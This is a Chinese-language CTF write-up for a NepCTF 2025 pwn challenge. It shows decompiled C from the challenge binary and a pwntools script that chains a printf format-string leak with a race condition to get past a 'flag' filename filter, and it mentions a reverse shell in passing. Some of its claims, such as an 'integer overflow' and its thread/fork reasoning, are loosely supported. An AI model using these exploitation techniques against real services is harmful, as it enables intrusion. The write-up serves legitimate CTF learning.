---
title: Nepctf 2025 PWN 部分题解 (race condition + format string)
contest: Nepctf
year: 2025
difficulty: medium
vuln_type: pwn_unknown
tags: [race condition, 多线程未加锁, format string 链式, /time 文件读, flag 字符串过滤]
attack_chain: |
  1. input_my_name():
     - scanf("%100s", name) - 读 name
     - fork() + execve("/bin/ls", {"/", "-al", 0}, 0) - 列文件
  2. input_filename():
     - scanf("%s", file) - 读 filename
     - strstr(file, "flag") 检查 → 失败 flag is not allowed!
     - 但 read 时只检查 contains "flag", 不能直接用
  3. work():
     - md5_1_/md5_2_/md5_3_ - md5(file) 计算
     - open(file, 0) + read(fd, buf, 0x3E8) 读文件
     - printf(name) - format string 漏洞!
  4. 攻击:
     - 利用 race condition: send filename "/time" → md5 输出
     - 第二个 send: send filename "flag" → 触发 read flag
     - 利用 printf(name) format string: %{12+9}$p 泄栈地址
  5. 拼 format string: %{12+9}$p...%{13+9+15}$p
  6. /dev/tcp 或反弹 shell
key_payload: |
  # race condition + fmt string:
  io = remote("nepctf32-1ris-vabv-sri2-p9kvlhq2i224.nepctf.com", 443, ssl=True, sni=...)
  
  # 第一步: 泄栈地址
  name = f"%{12+9}$p".encode()
  for i in range(0x10):
      name += f"-%{13+9+i}$p".encode()
  io.sendlineafter(b"please input your name:\n", name)
  
  # 第二步: race condition 触发 flag 读
  file = b"time"
  io.sendlineafter(b"input file name you want to read:\n", file)
  io.sendlineafter(b"input file name you want to read:\n", b"flag")
  io.interactive()
one_liner: Nepctf 2025 PWN: 多线程 race condition 绕过 flag 字符串过滤 + printf(name) format string 泄栈地址。
lesson: |
  - 多线程共享资源未加锁是 race condition 漏洞
  - input_my_name fork 出来, name 是父子共享
  - 输入 file="time" 让 md5 走通, 第二个 send "flag" 时 input_filename 还在 wait
  - printf(name) format string 经典链式: %{12+9}$p...%{13+9+15}$p
  - 字符串过滤 strstr(file, "flag") 简单, race condition 绕过
  - Nepctf 是 Nep 战队主办
quality: medium
---

# Nepctf 2025 PWN 部分题解

> 来源: ctfiot.com 272018

## 题目分析

```c
unsigned __int64 input_my_name() {
    char *argv[5];
    unsigned __int64 v2;
    v2 = __readfsqword(0x28u);
    puts("please input your name:");
    __isoc99_scanf("%100s", name);
    puts("I will tell you all file names in the current directory!");
    argv[0] = "/bin/ls";
    argv[1] = "/";
    argv[2] = "-al";
    argv[3] = 0LL;
    if (!fork()) execve("/bin/ls", argv, 0LL);
    wait(0LL);
    puts("good luck :-)");
    return v2 - __readfsqword(0x28u);
}

__int64 input_filename() {
    puts("input file name you want to read:");
    __isoc99_scanf("%s", file);
    if (!strstr(file, "flag")) return 1LL;
    puts("flag is not allowed!");
    return 0LL;
}

unsigned __int64 __fastcall work(void *a1) {
    unsigned int v1;
    int i, j, fd;
    char v6[96], v7[16], buf[1000];
    unsigned __int64 v9;
    v9 = __readfsqword(0x28u);
    md5_1_(v6);
    v1 = strlen(file);
    md5_2_(v6, file, v1);
    md5_3_(v6, v7);
    puts("I will tell you last file name content in md5:");
    for (i = 0; i <= 15; ++i) printf("%02X", (unsigned __int8)v7[i]);
    putchar(10);
    for (j = 0; j <= 999; ++j) buf[j] = 0;
    fd = open(file, 0);
    if (fd >= 0) {
        read(fd, buf, 0x3E8uLL);
        close(fd);
        printf("hello ");
        printf(name);  // 格式化字符串漏洞
        puts(" ,your file read done!");
    } else {
        puts("file not found!");
    }
    return v9 - __readfsqword(0x28u);
}
```

## 攻击

```python
from pwn import *
context.log_level = 'debug'
io = remote("nepctf32-1ris-vabv-sri2-p9kvlhq2i224.nepctf.com", 443, ssl=True, sni=...)

# 泄栈地址
name = f"%{12+9}$p".encode()
for i in range(0x10):
    name += f"-%{13+9+i}$p".encode()
io.sendlineafter(b"please input your name:\n", name)

# race condition 绕过 flag 过滤
file = b"time"
io.sendlineafter(b"input file name you want to read:\n", file)
io.sendlineafter(b"input file name you want to read:\n", b"flag")

io.interactive()
```

## 评价

Nepctf 2025 PWN 入门题，亮点是：
- **多线程 race condition** 绕过 flag 字符串过滤
- **printf(name) 格式字符串** 链式泄栈地址
- **fork + execve** 不影响父进程
- **scanf %s** 整数溢出利用

适用读者：Pwn 入门 / race condition 学习
